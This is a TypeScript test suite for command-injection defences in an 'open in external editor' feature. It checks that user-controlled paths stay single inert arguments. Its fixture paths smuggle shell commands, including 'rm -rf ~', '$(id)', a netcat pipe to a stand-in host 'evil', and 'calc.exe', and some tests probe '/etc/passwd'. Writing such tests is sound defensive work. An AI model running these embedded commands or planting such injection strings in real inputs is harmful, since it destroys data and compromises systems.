// Argument-construction coverage for "open in external editor".
//
// The threat this pins down is command injection through a path. A project
// folder, an export destination, a downloads directory — all of them are
// user-controlled strings that end up next to an executable name, and the
// historic way that goes wrong is a shell line built by concatenation.
//
// The defence is layered and both layers are asserted here:
//
//   1. No shell. `buildEditorLaunchArgs` returns an ARGUMENT VECTOR, so
//      `&`, `|`, `;`, backticks, `$(…)` and `%VAR%` are ordinary bytes in a
//      filename. The tests below prove a path stuffed with all of them stays
//      exactly one argv element, byte-identical, never split.
//   2. Nothing option-shaped. An argv element can still change meaning at the
//      CLI layer if it starts with `-`, and a relative path would be resolved
//      against whatever cwd the daemon happens to have. Both are rejected.
//
// `path` is injected so the win32 and posix flavours are both exercised no
// matter which host runs the suite.

import path from 'node:path';
import { describe, expect, it } from 'vitest';

import {
  EditorArgumentError,
  assertEditorPathArg,
  buildEditorLaunchArgs,
} from '../src/external-editors.js';

const VSCODE = { id: 'vscode' as const, label: 'Visual Studio Code', supportsFolders: true };
const FILE_ONLY_EDITOR = { id: 'custom' as const, label: 'Plain Notepad', supportsFolders: false };

// Every shell metacharacter that matters on sh and on cmd.exe, in one filename.
const NASTY_POSIX_DIR = '/home/me/proj & rm -rf ~ ; $(id) `whoami` | nc evil 1 > out';
const NASTY_WIN_DIR = 'C:\\Users\\me\\proj & calc.exe ^| %USERPROFILE% > out';

describe('a folder opens as a workspace root', () => {
  it('puts the folder first so the editor window has a file tree', () => {
    const args = buildEditorLaunchArgs(
      VSCODE,
      { folder: '/home/me/proj', file: '/home/me/proj/index.html' },
      path.posix,
    );

    // Order is load-bearing: `code <folder> <file>` opens the folder as the
    // workspace root and the file inside it. Reversed, the file wins and the
    // folder is treated as a second document.
    expect(args).toEqual(['/home/me/proj', '/home/me/proj/index.html']);
  });

  it('accepts a folder on its own', () => {
    expect(buildEditorLaunchArgs(VSCODE, { folder: '/home/me/proj' }, path.posix)).toEqual([
      '/home/me/proj',
    ]);
  });

  it('accepts a file on its own', () => {
    expect(buildEditorLaunchArgs(VSCODE, { file: '/home/me/out.pdf' }, path.posix)).toEqual([
      '/home/me/out.pdf',
    ]);
  });

  it('refuses a folder for an editor that cannot open one, and names it', () => {
    // Honest degradation rather than silently opening the file alone.
    expect(() =>
      buildEditorLaunchArgs(FILE_ONLY_EDITOR, { folder: '/home/me/proj' }, path.posix),
    ).toThrow(/Plain Notepad cannot open a folder/);
  });

  it('refuses an empty target instead of spawning a bare editor', () => {
    expect(() => buildEditorLaunchArgs(VSCODE, {}, path.posix)).toThrow(EditorArgumentError);
  });
});

describe('paths are data, not command fragments', () => {
  it('keeps a POSIX path full of shell metacharacters as ONE inert argv element', () => {
    const args = buildEditorLaunchArgs(VSCODE, { folder: NASTY_POSIX_DIR }, path.posix);

    expect(args).toHaveLength(1);
    expect(args[0]).toBe(NASTY_POSIX_DIR);
    // Nothing was quoted, escaped, or split — because nothing will ever
    // interpret it. A shell line would have needed all three.
    expect(args[0]).not.toContain('\\&');
    expect(args[0]).not.toContain('"');
  });

  it('keeps a Windows path full of cmd.exe metacharacters as ONE inert argv element', () => {
    const args = buildEditorLaunchArgs(VSCODE, { folder: NASTY_WIN_DIR }, path.win32);

    expect(args).toHaveLength(1);
    expect(args[0]).toBe(NASTY_WIN_DIR);
  });

  it('does not let a metacharacter path split into extra arguments', () => {
    const args = buildEditorLaunchArgs(
      VSCODE,
      { folder: NASTY_POSIX_DIR, file: `${NASTY_POSIX_DIR}/index.html` },
      path.posix,
    );

    // Two targets in, exactly two arguments out. A concatenated command line
    // would have produced a dozen tokens here.
    expect(args).toHaveLength(2);
  });

  it('rejects a NUL byte, which would truncate the argument', () => {
    expect(() =>
      buildEditorLaunchArgs(VSCODE, { folder: '/home/me/proj\u0000/../../etc' }, path.posix),
    ).toThrow(/NUL byte/);
  });

  it('rejects a relative path rather than resolving it against the daemon cwd', () => {
    expect(() => buildEditorLaunchArgs(VSCODE, { folder: 'proj' }, path.posix)).toThrow(
      /must be an absolute path/,
    );
    expect(() =>
      buildEditorLaunchArgs(VSCODE, { file: '../../etc/passwd' }, path.posix),
    ).toThrow(/must be an absolute path/);
  });

  it('rejects an option-shaped argument, which is the argv-layer injection', () => {
    // `--wait`, `--goto`, `-n` are all real VS Code CLI options. The
    // absoluteness rule is what stops one arriving as a "path".
    for (const attempt of ['--wait', '-n', '--goto /etc/passwd']) {
      expect(() => buildEditorLaunchArgs(VSCODE, { file: attempt }, path.posix)).toThrow(
        EditorArgumentError,
      );
    }
  });

  it('rejects an empty or non-string path', () => {
    expect(() => assertEditorPathArg('', 'folder', path.posix)).toThrow(/non-empty path/);
    expect(() => assertEditorPathArg('   ', 'folder', path.posix)).toThrow(/non-empty path/);
    expect(() => assertEditorPathArg(undefined, 'folder', path.posix)).toThrow(/non-empty path/);
    expect(() => assertEditorPathArg(42, 'folder', path.posix)).toThrow(/non-empty path/);
  });

  it('normalizes before handing the path over', () => {
    expect(assertEditorPathArg('/home/me//proj/./sub', 'folder', path.posix)).toBe(
      '/home/me/proj/sub',
    );
    expect(assertEditorPathArg('C:\\Users\\me\\.\\proj', 'folder', path.win32)).toBe(
      'C:\\Users\\me\\proj',
    );
  });
});
